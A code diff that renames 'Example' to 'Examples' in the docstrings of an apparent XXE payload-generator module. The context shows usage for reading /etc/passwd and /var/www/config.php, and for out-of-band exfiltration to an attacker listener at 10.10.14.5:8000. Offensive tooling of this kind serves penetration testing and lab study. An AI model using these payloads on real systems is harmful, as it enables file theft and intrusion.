@@ -71,7 +71,7 @@ def basic_file_read(file_path: str = "/etc/passwd", entity_name: str = "xxe") ->
     Returns:
         Simple XXE payload - file content appears in response
 
-    Example:
+    Examples:
         payload = basic_file_read("/etc/passwd")
         # If vulnerable, response will contain passwd file
     """
@@ -100,7 +100,7 @@ def blind_oob(base_url: str, file_path: str = "/etc/passwd", dtd_path: str = "xx
     Returns:
         XML payload to send to the vulnerable target
 
-    Example:
+    Examples:
         payload = blind_oob("http://10.10.14.5:8000")
         # Send this payload to the target's XML endpoint
     """
@@ -128,7 +128,7 @@ def oob_dtd(base_url: str, file_path: str = "/etc/passwd", filename: str = "xxe.
     Returns:
         Relative path where DTD was written (e.g., "xxe/xxe.dtd")
 
-    Example:
+    Examples:
         # Automatically writes to payloads/xxe/xxe.dtd
         dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
         # DTD is now ready to be served!
@@ -168,7 +168,7 @@ def parameter_entity(base_url: str, file_path: str = "/etc/passwd") -> str:
     Returns:
         Self-contained XXE payload with embedded DTD
 
-    Example:
+    Examples:
         payload = parameter_entity("http://10.10.14.5:8000")
         # One payload does everything - no DTD file needed!
     """
@@ -210,7 +210,7 @@ def php_filter_b64(file_path: str = "/etc/passwd") -> str:
     Returns:
         XXE payload using PHP filter wrapper
 
-    Example:
+    Examples:
         payload = php_filter_b64("/var/www/config.php")
         # Response will contain base64 encoded file
         # Decode with: base64.b64decode(response_text)
@@ -331,7 +331,7 @@ def generate_oob_files(base_url: str, file_path: str = "/etc/passwd") -> tuple[s
         - xxe_payload_path: Send this content to target
         - dtd_file_path: Automatically served from your server
 
-    Example:
+    Examples:
         # Generate everything
         xxe, dtd = generate_oob_files("http://10.10.14.5:8000")
 
@@ -369,7 +369,7 @@ def quick_test(base_url: str, file_path: str = "/etc/passwd") -> str:
     Returns:
         XXE payload string to send to target
 
-    Example:
+    Examples:
         # One function does everything!
         payload = quick_test("http://10.10.14.5:8000")
 
